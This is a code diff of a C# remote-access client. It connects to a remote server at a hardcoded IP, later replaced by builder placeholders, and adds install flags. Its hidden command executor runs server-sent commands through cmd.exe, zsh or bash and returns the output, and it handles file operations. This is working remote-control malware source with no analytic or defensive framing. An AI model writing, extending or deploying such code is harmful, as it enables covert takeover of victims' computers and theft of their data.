@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 
@@ -10,12 +11,23 @@ namespace ClientApp
     class Program
     {
         private static TcpClient client;
-        private static string serverAddress = "147.185.221.21";
-        private static int serverPort = 44468;
+        private static string serverAddress = "%ADDRESS%";
+        private static int serverPort = 02220;
+        private static string isInstall = "%DOINSTALL";
+        private static string install = "%INSTALL%";
         private static bool isConnected = false;
+        private static bool isInstallBool = false;
 
         static void Main(string[] args)
         {
+            if (isInstall == "True")
+            {
+                isInstallBool = true;
+            }
+            else if (isInstall == "False")
+            {
+                isInstallBool = false;
+            }
             Console.WriteLine("Client is starting...");
             ConnectToServer();
             StartPingRoutine();
@@ -108,6 +120,9 @@ namespace ClientApp
                 case "file":
                     HandleFileOperations(commandParts);
                     break;
+                case "pong":
+                    isConnected = true;
+                    break;
                 default:
                     SendData("Unknown command type.");
                     break;
@@ -116,20 +131,50 @@ namespace ClientApp
 
         static void ExecuteShellCommand(string command)
         {
-            ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", $"/c {command}")
+            // Determine the shell based on the operating system
+            string shell;
+            string shellArgs;
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            {
+                shell = "cmd.exe";
+                shellArgs = $"/c {command}";
+            }
+            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+            {
+                shell = "/bin/zsh";
+                shellArgs = $"-c \"{command}\"";
+            }
+            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+            {
+                shell = "/bin/bash";
+                shellArgs = $"-c \"{command}\"";
+            }
+            else
+            {
+                throw new InvalidOperationException("Unsupported operating system.");
+            }
+
+            ProcessStartInfo startInfo = new ProcessStartInfo(shell, shellArgs)
             {
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
                 UseShellExecute = false,
                 CreateNoWindow = true
             };
+
             using (Process proc = Process.Start(startInfo))
             {
                 string output = proc.StandardOutput.ReadToEnd();
                 string errors = proc.StandardError.ReadToEnd();
                 proc.WaitForExit();
-
-                SendData($"Output: {output}\nErrors: {errors}");
+                if (errors == null)
+                {
+                    SendData($"Output: {output}\n");
+                }
+                else if (errors != null) 
+                {
+                    SendData($"Output: {output}\nErrors: {errors}");
+                }
             }
         }
 
